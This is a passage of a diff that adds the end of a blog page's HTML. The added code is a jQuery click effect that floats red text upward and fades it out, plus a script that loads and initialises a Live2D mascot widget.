+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
